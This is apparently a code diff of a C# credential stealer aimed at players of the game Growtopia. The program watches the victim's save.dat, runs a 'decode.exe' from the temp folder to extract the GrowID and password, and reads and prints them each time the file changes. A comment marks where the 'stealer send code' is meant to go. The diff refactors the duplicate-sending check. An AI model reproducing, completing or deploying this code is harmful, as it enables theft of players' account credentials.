@@ -7,12 +7,12 @@ using System.Net;
 using System.Text;
 using System.Threading.Tasks;
 
-namespace ConsoleApp4
-{//SrMotion#1337
+namespace TraceSaveDat
+{//SrMotion#0001
     class Program
     {
 
-        public static string dirPath = "C:\\Users\\" + Environment.UserName + "\\AppData\\Local\\Growtopia";
+        public static string dirPath = "C:\\Users\\" + Environment.UserName + "\\AppData\\Local\\Growtopia",previus;
         public static string savePath = "C:\\Users\\" + Environment.UserName + "\\AppData\\Local\\Growtopia\\save.dat";
         public static FileSystemWatcher fileSystemWatcher = new FileSystemWatcher();
         public static void SendSaveDat()
@@ -22,18 +22,16 @@ namespace ConsoleApp4
             string username = File.ReadAllText(Path.GetTempPath() + "\\user.txt");
             string password = File.ReadAllText(Path.GetTempPath() + "\\pass.txt");
             #endregion
-            if(username == "" || password == "")
+            if(string.IsNullOrEmpty(username)|| string.IsNullOrEmpty(password))
             {
-                Console.WriteLine("password or username doesnt found");
+                Console.WriteLine("username or password is empty");
 
             }
             else
             {
                 Console.Write("------------------------\n| Send Success         |\n");
                 Console.WriteLine("------------------------\n| GrowID: " + username + "\n| Password: " + password + "\n------------------------\n");
-                //antispam
-                File.WriteAllText(Path.GetTempPath() + "\\antispam.txt", username + password);
-
+                previus = username + password;
                 //ur stealer send code :v
             }
 
@@ -52,7 +50,7 @@ namespace ConsoleApp4
             string username = File.ReadAllText(Path.GetTempPath() + "\\user.txt");
             string password = File.ReadAllText(Path.GetTempPath() + "\\pass.txt");
             #endregion
-            SendSaveDat();//read growid and password and send the save dat after focus gt if changes pass sends :V
+            SendSaveDat();//read growid and password and send the save dat after focus gt if changes pass sends :v
 
             fileSystemWatcher.Path = dirPath;
             fileSystemWatcher.NotifyFilter = NotifyFilters.LastWrite;
@@ -78,9 +76,6 @@ namespace ConsoleApp4
                     string fileNamea = Path.GetTempPath() + "\\user.txt";
                     FileStream fsa = new FileStream(fileNamea, FileMode.OpenOrCreate, FileAccess.Write);
                     fsa.Close();
-                    string fileNameaz = Path.GetTempPath() + "\\antispam.txt";
-                    FileStream fsaz = new FileStream(fileNameaz, FileMode.OpenOrCreate, FileAccess.Write);
-                    fsaz.Close();
                     Process.Start(new ProcessStartInfo
                     {
                         FileName = Path.GetTempPath() + "\\decode.exe",
@@ -91,22 +86,18 @@ namespace ConsoleApp4
                     string username = File.ReadAllText(Path.GetTempPath() + "\\user.txt");
                     string password = File.ReadAllText(Path.GetTempPath() + "\\pass.txt");
                     #endregion
-
-
                     fileSystemWatcher.EnableRaisingEvents = false;
-                    string read = File.ReadAllText(Path.GetTempPath() + "\\antispam.txt");
-                    if (read != username + password)
+                    if (previus != username + password)
                     {
-                        File.WriteAllText(Path.GetTempPath() + "\\antispam.txt", username + password);
-                        //SrMotion#1337
-                        if(username == "" || password == "")
+                        previus = username + password;
+                        //SrMotion#0001
+                        if(string.IsNullOrEmpty(username)|| string.IsNullOrEmpty(password))
                         {
-                            Console.WriteLine("password or username doesnt found");
+                            Console.WriteLine("username or password is empty");
                         }
                         else
                         {
                             SendSaveDat();
-
                         }
 
                     }
